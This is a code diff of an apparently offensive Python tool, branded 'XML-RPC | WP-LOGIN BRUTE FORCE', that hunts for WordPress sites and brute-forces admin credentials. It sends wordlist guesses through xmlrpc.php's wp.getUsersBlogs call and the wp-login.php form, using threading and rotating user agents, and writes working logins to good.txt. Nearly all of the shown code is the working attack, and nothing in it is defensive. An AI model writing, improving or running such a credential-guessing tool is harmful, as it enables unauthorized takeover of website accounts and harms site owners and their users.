@@ -11,10 +11,11 @@ import os
 import random
 import re
 import time
+import sys
+import concurrent.futures
 from urllib.parse import urlparse
 from multiprocessing.dummy import Pool
 from colorama import Fore, init
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib3.exceptions import InsecureRequestWarning
 requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
 init()
@@ -25,26 +26,28 @@ reset = Fore.RESET
 yellow = Fore.YELLOW
 blue = Fore.BLUE
 
-banner = """  
+banner = f"""{green}  
   _                _        
  | |              | |       
  | |__  _ __ _   _| |_ ___  
  | '_ \| '__| | | | __/ _ \ 
  | |_) | |  | |_| | ||  __/ 
  |_.__/|_|   \__,_|\__\___| 
-                            
-XML-RPC | WP-LOGIN BRUTE FORCE
+{reset}                            
+{yellow}XML-RPC{reset} |{yellow} WP-LOGIN BRUTE FORCE{reset}
 By @GrazzMean                          
 """
 
 thread = 10
+
+password = open("top-830_MCR.txt", "r").read()
 
 class Brute:
     def __init__(self, url):
         self.url = url
         self.thread = thread
         self.headers = {
-            "User-Agent": "{}",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0",
             "Accept-Language": "en-US,en;q=0.5"
         }
         self.cert = ("Files/cert.pem", "Files/key.pem")
@@ -52,7 +55,7 @@ class Brute:
         self.wplogin = 0
         self.error_site = 0
         self.good = 0
-        self.password = open("top-830_MCR.txt", "r").read()
+        self.password = password
         self.keyword = {
             "[UPPERLOGIN]": "",
             "[WPLOGIN]": "",
@@ -87,7 +90,8 @@ class Brute:
         except Exception as e:
             self.failed(e)
     
-    def setPassword(self, username):
+    def setPassword(self, username: str) -> list:
+       
         pw = self.password
         self.keyword["[UPPERLOGIN]"] = username.upper()
         self.keyword["[WPLOGIN]"] = username 
@@ -97,8 +101,10 @@ class Brute:
         for key, value in self.keyword.items():
             pw = pw.replace(key, value)
                 
-        return pw.splitlines()
+           
 
+        return pw.splitlines()
+    
     def isVulnXmlrpc(self):
         self.headers["User-Agent"] = random_user_agent()
         try:
@@ -136,20 +142,21 @@ class Brute:
         except Exception as e:
             self.failed(e)
         
-    def bruteXmlrpc(self, username, password):
-        payload = f"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{password}</value></param></params></methodCall>"""
+    def bruteXmlrpc(self, username: str, password: list) -> bool:
         headers = {
             "User-Agent": random_user_agent(),
             "Content-Type": "text/xml"
         }
         try:
-            req = requests.post(self.url+"/xmlrpc.php", headers=headers, verify=False, cert=self.cert, timeout=10, data=payload.encode('utf8')).text
-            if "<member><name>isAdmin</name><value>" in req:
-                print(f"[{yellow}XMLRPC{reset}] {self.url} => {green}{username}|{password}{reset}")
-                self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
-                return True
-            else:
-                print(f"[{yellow}XMLRPC{reset}] {self.url} => {red}{username}|{password}{reset}")
+            for password in password:
+                payload = f"""<?xml version="1.0" encoding="UTF-8"?><methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{password.encode('utf-8')}</value></param></params></methodCall>"""
+                req = requests.post(self.url+"/xmlrpc.php", headers=headers, cert=self.cert, verify=False, timeout=10, data=payload.encode('utf8')).text
+                if "<member><name>isAdmin</name><value>" in req:
+                    print(f"[{yellow}XMLRPC{reset}] {self.url} => {green}{username}|{password}{reset}")
+                    self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
+                    return True
+                else:
+                    print(f"[{yellow}XMLRPC{reset}] {self.url} => {red}{username}|{password}{reset}")
         except requests.exceptions.Timeout:
             self.failed("Timeout")
             time.sleep(3)
@@ -175,71 +182,80 @@ class Brute:
     def save_content(self, files, content):
         open(files, "a+", encoding="utf8").write(content+"\n")
 
-    def bruteWpLogin(self, username, password):
+    def bruteWpLogin(self, username: str, password: list) -> bool:
         headers = {
             "User-Agent": random_user_agent(),
             "Content-Type": "application/x-www-form-urlencoded",
         }
-        data = {"log":username, "pwd":password, "wp-submit":"Log-In", "redirect_to":f"{self.url}/wp-admin/", "testcookie":"1"}
+        
         try:
-            cooki = self.sessions.get(self.url, allow_redirects=False); cookies = dict(cooki.cookies)
-            req = self.sessions.post(self.url+"/wp-login.php", headers=headers, data=data, verify=False,  cookies=cookies).text
-            if "/wp-admin/admin-ajax.php" in req or "dashboard" in req:
-                print(f"[{blue}WPLOGIN{reset}] {self.url} => {green}{username}|{password}{reset}")
-                self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
-                return True
-            else:
-                print(f"[{blue}WPLOGIN{reset}] {self.url} => {red}{username}|{password}{reset}")
+            for password in password:
+                data = {"log":username, "pwd":password.encode('utf8'), "wp-submit":"Log-In", "redirect_to":f"{self.url}/wp-admin/", "testcookie":"1"}
+                req = self.sessions.post(self.url+"/wp-login.php", headers=headers, data=data, verify=False)
+                if "/wp-admin/admin-ajax.php" in req or "dashboard" in req:
+                    print(f"[{blue}WPLOGIN{reset}] {self.url} => {green}{username}|{password}{reset}")
+                    self.save_content("good.txt", f"{self.url}/wp-login.php#{username}@{password}")
+                    return True
+                else:
+                    print(f"[{blue}WPLOGIN{reset}] {self.url} => {red}{username}|{password}{reset}")
         except requests.exceptions.Timeout:
-            self.failed("Timeout")
+            self.failed("TIMEOUT")
         except Exception as e:
             self.failed(e)
 
-    
+    def GetCookies(self) -> bool:
+        try:
+            cooki = self.sessions.get(self.url, allow_redirects=False, headers=self.headers)
+            return True
+        except:
+            return False
+        
     def start(self):
-        if self.isWordpress():
-            if self.isVulnXmlrpc():
-                self.xmlrpc_lean = True
-            if self.isVulnWpLogin():
+        if not self.isWordpress():
+            pass
+        
+        if self.isVulnXmlrpc():
+            self.xmlrpc_lean = True
+        if self.isVulnWpLogin():
+            if self.GetCookies():
                 self.wplogin_lean = True
 
-            if self.xmlrpc_lean or self.wplogin_lean:
-                self.save_content("wordpress.txt", self.url)
-                username = self.searchUsername()
-                if username:
+        if self.xmlrpc_lean or self.wplogin_lean:
+            self.save_content("wordpress.txt", self.url)
+            username = self.searchUsername()
+            if not username:
+                return
+            
+            futures = []
+            with concurrent.futures.ThreadPoolExecutor(max_workers=self.thread) as executor:
+                for user in username:
+                    password = self.setPassword(user)
                     if self.xmlrpc_lean:
-                        with ThreadPoolExecutor(max_workers=self.thread) as j:
-                            for user in username:
-                                password = self.setPassword(user)
-                                for x in password:
-                                    brute = j.submit(self.bruteXmlrpc, user, x)
-                                    if brute.result():
-                                        time.sleep(5)
-                                        break
-
-                    if self.wplogin_lean and not self.xmlrpc_lean:
-                        with ThreadPoolExecutor(max_workers=self.thread) as j:
-                            for usr in username:
-                                password = self.setPassword(usr)
-                                for pwd in password:
-                                    brute = j.submit(self.bruteWpLogin, usr, pwd)
-                                    if brute.result():
-                                        time.sleep(5)
-                                        break
+                        futures.append(executor.submit(self.bruteXmlrpc, user, password))
+                    if self.wplogin_lean:
+                        futures.append(executor.submit(self.bruteWpLogin, user, password))
                     
+                    if not futures:
+                        break
 
-def create_socket(host, port):
+                    concurrent.futures.wait(futures)
+
+                    result = [future.result() for future in futures]
+                    if result:
+                        break                
+
+def create_socket(host: str, port: str) -> bool:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(10)
         res = s.connect_ex((host, port))
-        if res == 0:
-            s.close()
-            return True
-        s.close()
-        return False
+        if res != 0:
+            return False
+        return True
     except:
         return False
+    finally:
+        s.close()
 
 def checkPort(host: str):
     scheme = "null"
@@ -258,27 +274,27 @@ def checkPort(host: str):
     except Exception as e:
         return scheme
 
-def parseURL(url):
-    if url.startswith("http://"):
-        url = url.replace("http://", "")
-    elif url.startswith("https://"):
-        url = url.replace("https://", "")
+def parseURL(url: str) -> str:
+    url = url.replace('http://', '').replace('https://', '')
     scheme = checkPort(url)
     if scheme == "null":
         return
     url = scheme+"://"+url
-    if urlparse(url).path:
-        return urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path
-    return urlparse(url).scheme + "://" + urlparse(url).netloc 
+    clean = urlparse(url).scheme + "://" + urlparse(url).netloc + urlparse(url).path
+    return clean.rstrip('/')
 
 def startBrute(url):
     uri = parseURL(url)
-    if uri != None:
-        if uri.endswith("/"):
-            uri = uri.rstrip("/")
-        Brute(uri).start()
-    else:
+    # if uri != None:
+    #     if uri.endswith("/"):
+    #         uri = uri.rstrip("/")
+    #     Brute(uri).start()
+    # else:
+    #     print(f"[{red}#{reset}] {url} => {red}Die Website{reset}")
+    if not uri:
         print(f"[{red}#{reset}] {url} => {red}Die Website{reset}")
+        return
+    Brute(uri).start()
 
 
 def random_user_agent() -> str:
@@ -311,7 +327,11 @@ def main():
         print(e)
 
 if __name__ == '__main__':
-    createDirectory()
-    clear()
-    main()
+    try:
+        createDirectory()
+        clear()
+        main()
+    except KeyboardInterrupt:
+        sys.exit(1)
+    #Brute('http://kontol.com').start()
     
